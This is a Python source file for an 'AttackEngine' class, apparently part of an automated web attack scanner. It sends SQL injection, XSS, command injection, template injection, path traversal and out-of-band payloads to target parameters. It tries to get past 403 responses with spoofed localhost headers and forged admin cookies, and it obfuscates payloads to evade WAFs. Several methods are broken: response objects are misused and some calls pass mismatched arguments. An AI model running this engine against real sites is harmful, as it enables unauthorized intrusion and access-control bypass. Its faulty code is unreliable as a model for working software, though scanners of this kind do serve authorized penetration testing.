import asyncio
import time
import random
import json
import httpx # Use httpx for direct requests
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
import base64
import re
from typing import List, Dict, Any, Optional, Tuple
import threading
import subprocess
import os
import sys
from datetime import datetime
import shutil

# Import Payloads and ConsoleManager
from payloads import OOB_PAYLOADS, SQLI_PAYLOADS, XSS_PAYLOADS, CMD_PAYLOADS, SSTI_PAYLOADS, PATH_TRAVERSAL_PAYLOADS
from console_manager import ConsoleManager
from smart_detector import SmartDetector # Import SmartDetector definition

class AttackEngine:
    def __init__(self, console_manager: ConsoleManager, smart_detector: SmartDetector, interactsh_url: Optional[str] = None):
        self.console = console_manager
        self.detector = smart_detector # Use the passed SmartDetector instance
        self.interactsh_url = self._validate_interactsh_url(interactsh_url)
        self.findings: List[Dict[str, Any]] = []
        self.tested_endpoints: Dict[str, bool] = {} # Key: f"{method}:{url}:{param_name}:{vuln_type}"
        # Create a persistent httpx client
        self.client = httpx.AsyncClient(
            http2=True,
            verify=False, # Disable SSL verification
            follow_redirects=True,
            timeout=20.0, # Default timeout
            limits=httpx.Limits(max_connections=100, max_keepalive_connections=20),
            headers={"Accept": "*/*"}
        )
        self.console.print_debug("AttackEngine initialized.")
        if self.interactsh_url:
            self.console.print_info(f"Using Interactsh URL for OOB testing: {self.interactsh_url}")

    async def close_client(self):
        """Closes the httpx client."""
        if hasattr(self, 'client') and self.client and not self.client.is_closed:
            self.console.print_debug("Closing AttackEngine HTTP client...")
            await self.client.aclose() 

    def _validate_interactsh_url(self, url: Optional[str]) -> Optional[str]:
        """Removes http(s):// prefix from interactsh URL if present."""
        if url:
            parsed = urlparse(url)
            host = parsed.netloc or parsed.path # Handle cases with or without scheme
            if host:
                if '.' in host and len(host) > 4:
                    clean_host = host.strip('/')
                    self.console.print_debug(f"Validated Interactsh host: {clean_host}")
                    return clean_host
                else:
                    self.console.print_warning(f"Invalid Interactsh URL format provided: '{url}'. OOB testing disabled.")
                    return None
        return None

    def record_finding(self, type: str, severity: str, details: dict, url: str):
        """Records and prints a finding."""
        # Add finding to internal list (can be retrieved later)
        finding = {
            "type": type, "severity": severity, "url": url,
            "details": details, "timestamp": time.time()
        }
        self.findings.append(finding)
        # Print finding immediately
        self.console.print_finding(type, severity, details, url)

    def _get_test_key(self, method: str, url: str, param: str, vuln_type: str) -> str:
        """Generates a unique key for tracking tested parameters."""
        try:
            url_parsed = urlparse(url)
            query_params = sorted(parse_qs(url_parsed.query, keep_blank_values=True).items())
            sorted_query = urlencode(query_params, doseq=True)
            url_norm = url_parsed._replace(query=sorted_query, fragment="").geturl()
            return f"{method}:{url_norm}:{param}:{vuln_type}"
        except Exception:
             return f"{method}:{url}:{param}:{vuln_type}" # Fallback

    def _mark_tested(self, key: str): self.tested_endpoints[key] = True
    def _was_tested(self, key: str) -> bool: return key in self.tested_endpoints

    async def _make_request(self, url: str, method: str = "GET", params: Optional[Dict] = None, data: Optional[Any] = None, headers: Optional[Dict] = None, payload_info: str = "") -> Optional[httpx.Response]:
        """Helper to make requests with the persistent httpx client, handling errors and logging."""
        req_headers = await self.detector.get_next_user_agent_and_headers()
        if headers: req_headers.update(headers)

        # Determine content type if data is present
        content_type_sent = None
        req_data = data
        if data is not None:
            if isinstance(data, dict):
                # Default to form encoding? Or require explicit header? Let's try form encoding.
                content_type_sent = req_headers.get('Content-Type', 'application/x-www-form-urlencoded')
                if 'application/json' in content_type_sent:
                     try: req_data = json.dumps(data)
                     except Exception: self.console.print_warning(f"Failed to JSON encode data for {url}")
                elif 'application/x-www-form-urlencoded' in content_type_sent:
                      req_data = urlencode(data, doseq=True) # Encode dict as form data
                req_headers['Content-Type'] = content_type_sent
            elif isinstance(data, str):
                 # Assume raw string data, ensure Content-Type is set appropriately if needed
                 if 'Content-Type' not in req_headers:
                     req_headers['Content-Type'] = 'text/plain' # Default? Or let httpx handle?
                 content_type_sent = req_headers['Content-Type']

        log_params = str(params)[:100] + '...' if params and len(str(params)) > 100 else params
        log_data = str(req_data)[:100] + '...' if req_data and len(str(req_data)) > 100 else req_data
        self.console.print_debug(f"Requesting [{payload_info}]: {method} {url} Params: {log_params} Data: {log_data} CT: {content_type_sent or 'None'}")

        start_time = time.time()
        try:
            response = await self.client.request(
                method, url, params=params, content=req_data, # Use content for bytes/str
                headers=req_headers
            )
            
            # Validar el content-type antes de procesar el contenido
            if not self.is_valid_content_type(response.headers.get("content-type", "")):
                self.console.print_warning(f"Invalid content type for {url}: {response.headers.get('content-type')}")
                return response  # O manejar de otra manera según sea necesario

            # Procesar el contenido si es válido
            content = await response.text()
            duration = time.time() - start_time
            self.console.print_debug(f"Response [{payload_info}]: {response.status_code} in {duration:.2f}s (Len:{len(content)}) for {url}")
            return response
        except httpx.TimeoutException:
            self.console.print_warning(f"Request timed out ({self.client.timeout}s) for {url} [{payload_info}]")
            return None
        except httpx.ConnectError as e:
            self.console.print_warning(f"Connection error for {url} [{payload_info}]: {e}")
            return None
        except httpx.RequestError as e:
            self.console.print_warning(f"Request failed for {url} [{payload_info}]: {e}")
            return None
        except Exception as e:
            self.console.print_error(f"Unexpected error during request to {url} [{payload_info}]: {e}")
            return None
         

    async def handle_forbidden(self, url: str) -> bool:
        """Attempts to bypass 403 Forbidden using custom techniques via httpx."""
        self.console.print_warning(f"403 Detected for {url}. Attempting bypass techniques...")
        original_parsed = urlparse(url)
        base_url = f"{original_parsed.scheme}://{original_parsed.netloc}"
        path = original_parsed.path if original_parsed.path else "/"

        # --- Bypass Attempts Setup ---
        bypass_attempts = []
        # 1. Method Switching
        for method in ["POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS", "TRACE", "CONNECT"]:
            bypass_attempts.append({"method": method, "url": url, "desc": f"Method={method}"})
        # 2. Path variations
        paths_to_try = [
            path, path + '/', f"/{path.strip('/')}" , f"/{path.strip('/')}/",
            f"{path}/.", f"{path}/..;", f"{path}..;", f"{path}//", f"{path}/%2e/",
            f"{path}.json", f"{path}.xml", f"{path}.config", f"{path}.bak", f"{path}.old",
            path.upper(), path.lower(),
        ]
        if any(c.isalpha() for c in path) and path != path.upper():
             paths_to_try.append(''.join(random.choice([c.upper(), c.lower()]) for c in path))
        for p_var in set(paths_to_try):
             bypass_url = urljoin(base_url, p_var)
             if original_parsed.query: bypass_url += "?" + original_parsed.query
             if self._normalize_url(bypass_url) != self._normalize_url(url):
                 bypass_attempts.append({"method": "GET", "url": bypass_url, "desc": f"Path={p_var}"})
        # 3. Header injections
        headers_to_try = [
            {"X-Original-URL": path}, {"X-Rewrite-URL": path}, {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Forwarded-For": "127.0.0.1"}, {"Referer": base_url}, {"Referer": url},
            {"X-Originating-IP": "127.0.0.1"}, {"X-Remote-IP": "127.0.0.1"}, {"X-Client-IP": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"}, {"X-Host": original_parsed.netloc}, {"Host": "localhost"},
            {"Content-Length": "0"},
            {"Cookie": "isAdmin=true; role=admin"},
        ]
        for h in headers_to_try:
             method = "POST" if "Content-Length" in h else "GET"
             bypass_attempts.append({"method": method, "url": url, "headers": h, "desc": f"Header={list(h.keys())[0]}"})
        # 4. Cookie Manipulation
        cookies_to_try = [
            {"Cookie": "session=invalid;"},
            {"Cookie": "auth=admin;"},
            {"Cookie": "user=guest;"},
        ]
        for c in cookies_to_try:
            bypass_attempts.append({"method": "GET", "url": url, "headers": c, "desc": f"Cookie={list(c.values())[0]}"})
        # 5. URL Obfuscation
        obfuscated_paths = [
            f"{path}/%2e%2e/", f"{path}/%2e%2e%2f", f"{path}/%252e%252e/",
            f"{path}/%252e%252e%252f", f"{path}/%c0%af", f"{path}/%c0%ae%c0%af",
        ]
        for op in obfuscated_paths:
            obfuscated_url = urljoin(base_url, op)
            if self._normalize_url(obfuscated_url) != self._normalize_url(url):
                bypass_attempts.append({"method": "GET", "url": obfuscated_url, "desc": f"ObfuscatedPath={op}"})

        # --- Execute Attempts ---
        bypass_found = False
        for attempt in bypass_attempts:
            await asyncio.sleep(random.uniform(0.05, 0.15))
            self.console.print_debug(f"403 Bypass Attempt: {attempt['desc']} on {attempt['url']} ({attempt.get('method','GET')})")
            response = await self._make_request(
                url=attempt["url"], method=attempt.get("method", "GET"),
                headers=attempt.get("headers"), payload_info=f"403 Bypass ({attempt['desc']})"
            )
            if response and response.status_code != 403:
                 bypass_found = True
                 self.console.print_success(f"Potential 403 Bypass FOUND for {url} -> {attempt['url']} ({attempt.get('method','GET')}) with '{attempt['desc']}' - Status: {response.status_code}")
                 self.record_finding("forbidden_bypass", "HIGH", {
                     "original_url": url, "bypass_url": attempt['url'], "bypass_method": attempt.get('method', 'GET'),
                     "bypass_technique": attempt['desc'], "resulting_status": response.status_code,
                 }, url)
        if not bypass_found:
            self.console.print_info(f"No obvious 403 bypass found for {url} with tested techniques.")
        return bypass_found

    def _normalize_url(self, url: str) -> str:
        try: return urlparse(url)._replace(fragment="", query="").geturl().rstrip('/')
        except: return url.rstrip('/')

    async def test_vulnerability(self, url: str, method: str = "GET", params=None, data=None, headers=None):
        self.console.print_info(f"Starting vulnerability test on {method} {url}")
        findings = []
        
        params = params or {}
        data = data or {}
        headers = headers or {}
        
        # Detectar WAF primero
        waf_info = await self.detect_waf(url, method)
        if waf_info:
            self.record_finding("waf_detection", "INFO", {
                "waf": waf_info["waf"], "signature": waf_info["signature"]
            }, url)

        # Función auxiliar para probar payloads
        async def test_payloads(payload_dict, vuln_type, verify_func):
            for category, payloads in payload_dict.items():
                if isinstance(payloads, dict):
                    for subcat, sub_payloads in payloads.items():
                        for payload in sub_payloads:
                            self.console.print_debug(f"Testing {vuln_type}-{category}-{subcat}: {payload}")
                            finding = await self._test_single_payload(url, method, payload, params, data, headers, verify_func)
                            if finding:
                                findings.append(finding)
                else:
                    for payload in payloads:
                        self.console.print_debug(f"Testing {vuln_type}-{category}: {payload}")
                        finding = await self._test_single_payload(url, method, payload, params, data, headers, verify_func)
                        if finding:
                            findings.append(finding)
        
        # Probar todas las categorías, incluso sin params/data
        await test_payloads(SQLI_PAYLOADS, "SQLi", self._verify_sqli_error)
        await test_payloads(XSS_PAYLOADS, "XSS", self._verify_xss_reflection)
        await test_payloads(CMD_PAYLOADS, "CMDi", self._verify_cmdi_time)
        await test_payloads(SSTI_PAYLOADS, "SSTI", self._verify_ssti)
        await test_payloads(PATH_TRAVERSAL_PAYLOADS, "PathTraversal", self._verify_path_traversal)
        if self.interactsh_url:
            await test_payloads(OOB_PAYLOADS, "OOB", self._verify_oob)
        
        # Añadir pruebas en cabeceras
        header_findings = await self.test_headers(url, method)
        findings.extend(header_findings)
        
        if findings:
            self.console.print_success(f"Found {len(findings)} vulnerabilities on {url}")
        else:
            self.console.print_debug(f"No vulnerabilities found on {url}")
        return findings

    async def test_sqli(self, url, method, base_params, base_data, field):
        vuln_type = "SQLi"; test_key = self._get_test_key(method, url, field, vuln_type)
        if self._was_tested(test_key): return; self._mark_tested(test_key)
        self.console.print_debug(f"Testing SQLi on: {method} {url} (Field: {field})")
        original_value = base_params.get(field, base_data.get(field, '1'))
        sleep_time = 5

        async def run_check(payload_category: str, check_payloads: List[str], verification_func: callable, verification_desc: str) -> bool:
            for payload_template in check_payloads:
                payload = payload_template
                if "SLEEP_TIME" in payload: payload = payload.replace("SLEEP_TIME", str(sleep_time))
                if "INTERACTSH_URL" in payload:
                    if not self.interactsh_url: continue
                    payload = payload.replace("INTERACTSH_URL", self.interactsh_url)
                obfuscated_payload = self.detector.obfuscate_payload(payload, level=random.randint(1,2))
                test_values = [str(original_value) + obfuscated_payload, obfuscated_payload]

                for test_val in test_values:
                    current_params=base_params.copy(); current_data=base_data.copy()
                    if field in current_params: current_params[field]=test_val
                    if field in current_data: current_data[field]=test_val

                    start_time = time.time()
                    response = await self._make_request(url, method, params=current_params, data=current_data, payload_info=f"SQLi-{payload_category}")
                    duration = time.time() - start_time
                    if response is not None:
                        is_vuln, details = await verification_func(response, duration, sleep_time, payload, test_val)
                        self.console.print_attack_attempt(url, method, f"SQLi-{payload_category}", test_val, response.status_code, len(response.content), is_vuln, verification_desc)
                        if is_vuln:
                            self.record_finding(f"sql_injection_{payload_category.lower()}", "CRITICAL", {
                                "field": field, "payload_used": payload, "obfuscated_payload": obfuscated_payload,
                                "test_value": test_val, "verification": f"{verification_desc} ({details})"
                            }, url)
                            return True # Found for category
            return False

        if await run_check("error", SQLI_PAYLOADS['error_based'], self._verify_sqli_error, "Error Message"): return
        if await run_check("time", SQLI_PAYLOADS['blind_time'], self._verify_sqli_time, f"Time Delay ~{sleep_time}s"): return
        if self.interactsh_url:
            if await run_check("oob", SQLI_PAYLOADS['oob'], self._verify_oob, "OOB Interaction"): return

    async def _verify_sqli_error(self, response: httpx.Response, duration, sleep_time, payload, test_val) -> Tuple[bool, str]:
        if not response: return False, "No Response"
        text = response.text.lower()
        errors = ["sql syntax", "mysql", "syntax error", "unclosed quotation", "unterminated string", "pg_query", "postgresql", "ora-", "oracle", "sqlite", "odbc driver", "microsoft ole db", "invalid column name", "error converting data type", "you have an error in your sql syntax", "warning: mysql", "supplied argument is not a valid", " ORA-"]
        found_errors = [err for err in errors if err in text]
        if test_val.lower() in text and len(found_errors) == 1 and found_errors[0] in ['error', 'warning']: # Basic check for self-reflection causing generic errors
             return False, "Payload Reflected, Generic Error Likely"
        return bool(found_errors), f"Detected: {', '.join(found_errors)}" if found_errors else "No Error Signature"

    async def _verify_sqli_time(self, response: httpx.Response, duration, sleep_time, payload, test_val) -> Tuple[bool, str]:
        lower_bound = max(1.0, sleep_time * 0.8); upper_bound = sleep_time * 2.5
        is_delayed = lower_bound <= duration <= upper_bound
        return is_delayed, f"Duration={duration:.2f}s"

    async def test_xss(self, url, method, base_params, base_data, field):
        vuln_type = "XSS"; test_key = self._get_test_key(method, url, field, vuln_type)
        if self._was_tested(test_key): return; self._mark_tested(test_key)
        self.console.print_debug(f"Testing XSS on: {method} {url} (Field: {field})")
        original_value = base_params.get(field, base_data.get(field, ''))
        unique_marker = f"rhxss{random.randint(1000,9999)}"

        for category, payloads in XSS_PAYLOADS.items():
             payloads_to_test = payloads
             if isinstance(payloads, dict): # Skip framework/complex categories for now
                 continue
             for payload_template in payloads_to_test:
                 payload_with_marker = payload_template.replace("alert(1)", f"alert('{unique_marker}')").replace("`1`", f"`{unique_marker}`")
                 obfuscated_payload = self.detector.obfuscate_payload(payload_with_marker, level=random.randint(0, 1))
                 test_values = [str(original_value) + obfuscated_payload, obfuscated_payload]

                 for test_val in test_values:
                    current_params=base_params.copy(); current_data=base_data.copy()
                    if field in current_params: current_params[field]=test_val
                    if field in current_data: current_data[field]=test_val
                    response = await self._make_request(url, method, params=current_params, data=current_data, payload_info=f"XSS-{category}")

                    if response:
                        content_type = response.headers.get("content-type", "").lower()
                        is_html = "html" in content_type
                        is_vuln, details = self._verify_xss_reflection(response, obfuscated_payload, unique_marker, is_html)
                        self.console.print_attack_attempt(url, method, f"XSS-{category}", test_val, response.status_code, len(response.content), is_vuln, "Reflection")
                        if is_vuln:
                            self.record_finding(f"xss_reflected_{category.lower()}", "HIGH", {
                                "field": field, "payload_used": payload_with_marker, "obfuscated_payload": obfuscated_payload,
                                "test_value": test_val, "verification": f"Reflected Unescaped ({details})"
                            }, url)
                            return # Found for field

    def _verify_xss_reflection(self, response: httpx.Response, payload: str, marker: str, is_html: bool) -> Tuple[bool, str]:
        if not response or not payload: return False, "No Response/Payload"
        body = response.text
        if marker not in body: return False, "Marker Not Found"
        if not is_html: return False, f"Marker Reflected in Non-HTML ({response.headers.get('content-type','')})"

        sensitive_chars = ['<', '>', '"', "'"]
        found_unescaped = False
        details = set()
        marker_indices = [m.start() for m in re.finditer(re.escape(marker), body)]

        for idx in marker_indices:
            context_window = body[max(0, idx - 150):min(len(body), idx + len(marker) + 150)]
            context_unescaped = True
            if '<' in payload and ('&lt;' in context_window or '<script' not in context_window.lower()): context_unescaped &= False
            if '"' in payload and '&quot;' in context_window: context_unescaped &= False
            if "'" in payload and ('&#39;' in context_window or "&apos;" in context_window): context_unescaped &= False
            if '>' in payload and '&gt;' in context_window: context_unescaped &= False

            if context_unescaped:
                 simplified_payload = re.sub(r'alert\(.*\)', '', payload)
                 if simplified_payload[:10] in context_window or simplified_payload[-10:] in context_window:
                     found_unescaped = True
                     details.add("Payload structure seems present unescaped")

        return found_unescaped, ", ".join(details) if details else "No Clear Unescaped Reflection Found"

    async def test_cmdi(self, url, method, base_params, base_data, field):
        vuln_type = "CMDi"; test_key = self._get_test_key(method, url, field, vuln_type)
        if self._was_tested(test_key): return; self._mark_tested(test_key)
        self.console.print_debug(f"Testing CMDi on: {method} {url} (Field: {field})")
        original_value = base_params.get(field, base_data.get(field, ''))
        sleep_time = 8

        async def run_check(payload_category: str, check_payloads: List[str], verification_func: callable, verification_desc: str) -> bool:
             for payload_template in check_payloads:
                 payload = payload_template
                 if "SLEEP_TIME" in payload: payload = payload.replace("SLEEP_TIME", str(sleep_time))
                 if "INTERACTSH_URL" in payload:
                    if not self.interactsh_url: continue
                    payload = payload.replace("INTERACTSH_URL", self.interactsh_url)

                 obfuscated_payload = self.detector.obfuscate_payload(payload, level=random.randint(0, 1))
                 test_values = [str(original_value) + obfuscated_payload, obfuscated_payload]

                 for test_val in test_values:
                    current_params=base_params.copy(); current_data=base_data.copy()
                    if field in current_params: current_params[field]=test_val
                    if field in current_data: current_data[field]=test_val
                    start_time = time.time()
                    response = await self._make_request(url, method, params=current_params, data=current_data, payload_info=f"CMDi-{payload_category}")
                    duration = time.time() - start_time

                    if response is not None:
                        is_vuln, details = await verification_func(response, duration, sleep_time, payload, test_val)
                        self.console.print_attack_attempt(url, method, f"CMDi-{payload_category}", test_val, response.status_code, len(response.content), is_vuln, verification_desc)
                        if is_vuln:
                            self.record_finding(f"command_injection_{payload_category.lower()}", "CRITICAL", {
                                "field": field, "payload_used": payload, "obfuscated_payload": obfuscated_payload,
                                "test_value": test_val, "verification": f"{verification_desc} ({details})"
                            }, url)
                            return True
             return False

        if await run_check("time", CMD_PAYLOADS['blind_time'], self._verify_cmdi_time, f"Time Delay ~{sleep_time}s"): return
        if self.interactsh_url:
             if await run_check("oob", CMD_PAYLOADS['oob'], self._verify_oob, "OOB Interaction"): return

    async def _verify_cmdi_time(self, response: httpx.Response, duration, sleep_time, payload, test_val) -> Tuple[bool, str]:
        lower_bound = max(1.5, sleep_time * 0.85); upper_bound = sleep_time * 2.5
        is_delayed = lower_bound <= duration <= upper_bound
        return is_delayed, f"Duration={duration:.2f}s"

    async def test_ssti(self, url, method, base_params, base_data, field):
        vuln_type = "SSTI"; test_key = self._get_test_key(method, url, field, vuln_type)
        if self._was_tested(test_key): return; self._mark_tested(test_key)
        self.console.print_debug(f"Testing SSTI on: {method} {url} (Field: {field})")
        original_value = base_params.get(field, base_data.get(field, ''))
        expected_result_str = str(49)  # 7*7

        # Define payloads for different template engines
        payloads = {
            "jinja2": ["{{ 7 * 7 }}", "{{ config }}"],
            "freemarker": ["${7 * 7}", "${config}"],
            # Agregar más motores y sus payloads
        }

        for engine, payload_list in payloads.items():
            for payload in payload_list:
                obfuscated_payload = self.detector.obfuscate_payload(payload, level=0)  # No obfuscation for SSTI typically
                current_params = base_params.copy()
                if field in current_params:
                    current_params[field] = obfuscated_payload

                response = await self._make_request(url, method, params=current_params)

                if response:
                    is_vuln, details = await self._verify_ssti(response, expected_result_str, payload, engine)
                    if is_vuln:
                        self.record_finding(f"ssti_{engine.lower()}", "CRITICAL", {
                            "field": field,
                            "payload_used": payload,
                            "test_value": obfuscated_payload,
                            "verification": f"Confirmed {details}"
                        }, url)
                        return  # Found for field

    async def _verify_ssti_jinja2(self, response: httpx.Response, expected: str, payload: str) -> Tuple[bool, str]:
        """Verifies SSTI for Jinja2 templates."""
        content = await response.text()
        if "{{" in payload and "}}" in payload and expected in content:
            return True, "Jinja2 SSTI confirmed"
        return False, ""

    async def _verify_ssti_freemarker(self, response: httpx.Response, expected: str, payload: str) -> Tuple[bool, str]:
        """Verifies SSTI for Freemarker templates."""
        content = await response.text()
        if "${" in payload and "}" in payload and expected in content:
            return True, "Freemarker SSTI confirmed"
        return False, ""

    async def _verify_ssti(self, response: httpx.Response, expected: str, payload: str, template_engine: str) -> Tuple[bool, str]:
        """General SSTI verification method."""
        if template_engine == "jinja2":
            return await self._verify_ssti_jinja2(response, expected, payload)
        elif template_engine == "freemarker":
            return await self._verify_ssti_freemarker(response, expected, payload)
        # Agregar más motores de plantillas según sea necesario
        return False, "Unsupported template engine"

    async def test_path_traversal(self, url, method, base_params=None, base_data=None, field=None, path_itself=False):
        vuln_type = "PathTraversal"; target_desc = "__PATH__" if path_itself else field
        test_key = self._get_test_key(method, url, target_desc, vuln_type)
        if self._was_tested(test_key): return; self._mark_tested(test_key)

        if path_itself: self.console.print_debug(f"Testing Path Traversal on URL Path: {method} {url}")
        else: self.console.print_debug(f"Testing Path Traversal on: {method} {url} (Field: {field})")

        all_payloads = [p for cat_payloads in PATH_TRAVERSAL_PAYLOADS.values() for p in cat_payloads]

        for payload in all_payloads:
             test_url = url; current_params=base_params.copy() if base_params else {}; current_data=base_data.copy() if base_data else {}
             applied_payload = self.detector.obfuscate_payload(payload, level=random.randint(0,1))

             if path_itself:
                 parsed_url = urlparse(url)
                 base_path = parsed_url.path.rsplit('/', 1)[0] if '/' in parsed_url.path else ''
                 try: test_path = urljoin(base_path + "/", applied_payload.strip('/'))
                 except ValueError: continue
                 test_url = parsed_url._replace(path=test_path).geturl()
                 payload_info = f"PathTrav-PATH"
                 test_val = test_url
             elif field:
                 test_val = applied_payload
                 if field in current_params: current_params[field] = test_val
                 if field in current_data: current_data[field] = test_val
                 payload_info = f"PathTrav-{field}"
             else: continue

             response = await self._make_request(test_url, method, params=current_params, data=current_data, payload_info=payload_info)

             if response:
                 is_vuln, details = self._verify_path_traversal(response)
                 self.console.print_attack_attempt(test_url, method, "PathTrav", payload, response.status_code, len(response.content), is_vuln, "File Content/Error")
                 if is_vuln:
                     self.record_finding("path_traversal", "HIGH", {
                         "target": "URL Path" if path_itself else f"Field: {field}",
                         "payload_used": payload, "tested_value": test_val,
                         "verification": f"Sensitive Content/Error ({details})"
                     }, url)
                     return

    async def _verify_path_traversal(self, response):
        content = await response.text().lower()
        sensitive_keywords = ["/etc/passwd", "root:", "/windows/", "win.ini"]
        if response.status == 200 and any(keyword in content for keyword in sensitive_keywords):
            self.console.print_debug("Path traversal confirmed: sensitive content found")
            return True
        if response.status >= 500 and "error" in content:
            self.console.print_debug("Path traversal possible: server error")
            return True
        self.console.print_debug("Path traversal not confirmed")
        return False

    async def _verify_oob(self, interactsh_url: str, payload_type: str) -> Tuple[bool, str]:
        """Verifica si hay interacciones OOB con el servidor Interactsh."""
        try:
            # Esperar un tiempo para que lleguen las interacciones
            await asyncio.sleep(2)
            
            # Hacer una petición GET al servidor Interactsh
            response = await self._make_request(f"http://{interactsh_url}/poll")
            
            if response.status_code == 200:
                data = response.json()
                
                # Verificar si hay interacciones
                if data.get("data"):
                    for interaction in data["data"]:
                        if interaction.get("type") == payload_type:
                            self.console.print_success(f"¡Interacción OOB detectada! Tipo: {payload_type}")
                            return True, f"Interacción OOB detectada: {interaction}"
                
                self.console.print_debug("No se detectaron interacciones OOB")
                return False, "No se detectaron interacciones OOB"
            else:
                self.console.print_error(f"Error al verificar interacciones OOB: {response.status_code}")
                return False, f"Error al verificar interacciones OOB: {response.status_code}"
                
        except Exception as e:
            self.console.print_error(f"Error al verificar interacciones OOB: {e}")
            return False, f"Error al verificar interacciones OOB: {e}"

    async def test_oob_vulnerabilities(self, url: str, interactsh_url: str) -> List[Dict]:
        """Prueba vulnerabilidades OOB usando payloads específicos."""
        findings = []
        
        try:
            # Obtener los payloads OOB
            oob_payloads = OOB_PAYLOADS
            
            for payload_type, payloads in oob_payloads.items():
                self.console.print_info(f"Probando payloads OOB de tipo: {payload_type}")
                
                for payload in payloads:
                    # Reemplazar el placeholder de Interactsh
                    payload = payload.replace("INTERACTSH_URL", interactsh_url)
                    
                    # Enviar el payload
                    response = await self._make_request(url, data={"input": payload})
                    
                    # Verificar si hay interacciones
                    success, message = await self._verify_oob(interactsh_url, payload_type)
                    
                    if success:
                        finding = {
                            "type": "OOB",
                            "payload_type": payload_type,
                            "payload": payload,
                            "url": url,
                            "status_code": response.status_code,
                            "message": message
                        }
                        findings.append(finding)
                        await self.record_finding(finding)
                        
        except Exception as e:
            self.console.print_error(f"Error al probar vulnerabilidades OOB: {e}")
            
        return findings

    async def test_vulnerabilities(self, url: str, interactsh_url: str = None) -> List[Dict]:
        """Prueba todas las vulnerabilidades conocidas."""
        findings = []
        
        try:
            # Probar vulnerabilidades OOB si se proporciona una URL de Interactsh
            if interactsh_url:
                oob_findings = await self.test_oob_vulnerabilities(url, interactsh_url)
                findings.extend(oob_findings)
            
            # Probar otras vulnerabilidades...
            
        except Exception as e:
            self.console.print_error(f"Error al probar vulnerabilidades: {e}")
            
        return findings

    def get_findings(self) -> List[Dict[str, Any]]:
        """Returns the list of findings collected by the engine."""
        return self.findings

    async def __aenter__(self):
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.close_client()

    async def _test_single_payload(self, url, method, payload, params, data, headers, verify_func):
        # Inyectar payload en un parámetro genérico o existente
        test_params = {**params, "test": payload} if not params else {k: payload if i == 0 else v for i, (k, v) in enumerate(params.items())}
        test_data = {**data, "test": payload} if not data else {k: payload if i == 0 else v for i, (k, v) in enumerate(data.items())}
        
        try:
            response = await self._make_request(url, method, params=test_params, data=test_data, headers=headers)
            content = await response.text()
            self.console.print_debug(f"Response status: {response.status}, length: {len(content)}")
            
            if verify_func(response):
                return {
                    "type": "vulnerability",
                    "url": url,
                    "payload": payload,
                    "status": response.status,
                    "details": f"Triggered {verify_func.__name__} (Len: {len(content)})"
                }
            # Detectar códigos de error 500+
            if response.status >= 500:
                return {
                    "type": "server_error",
                    "url": url,
                    "payload": payload,
                    "status": response.status,
                    "details": f"Server error detected (Len: {len(content)})"
                }
        except Exception as e:
            self.console.print_warning(f"Error testing payload {payload}: {e}")
        return None

    async def detect_waf(self, url: str, method: str = "GET") -> Optional[Dict]:
        self.console.print_info(f"Detecting WAF on {url}")
        waf_signatures = {
            "Cloudflare": ["cf-ray", "cloudflare", "__cfduid"],
            "AWS WAF": ["aws-waf-token", "x-amzn-waf"],
            "Imperva": ["x-iinfo", "incap_ses"],
            "Sucuri": ["x-sucuri-id", "sucuri/cloudproxy"],
            "F5 BIG-IP": ["bigipserver"]
        }
        test_headers = {"User-Agent": "' OR 1=1 --"}
        response = await self._make_request(url, method, headers=test_headers, payload_info="WAF Detection")
        if not response:
            return None
        headers = {k.lower(): v for k, v in response.headers.items()}
        body = await response.text()
        for waf, signatures in waf_signatures.items():
            for sig in signatures:
                if sig in headers or sig in body.lower():
                    self.console.print_warning(f"WAF detected: {waf} (Signature: {sig})")
                    return {"waf": waf, "signature": sig}
        if response.status_code in [403, 429]:
            self.console.print_warning(f"Possible WAF detected (Status: {response.status_code})")
            return {"waf": "Unknown", "signature": f"Status {response.status_code}"}
        self.console.print_debug("No WAF detected")
        return None

    def is_valid_content_type(self, content_type: str) -> bool:
        """Validates the content type of the response."""
        valid_types = ['text/html', 'application/json', 'application/xml']
        return any(valid in content_type for valid in valid_types)


          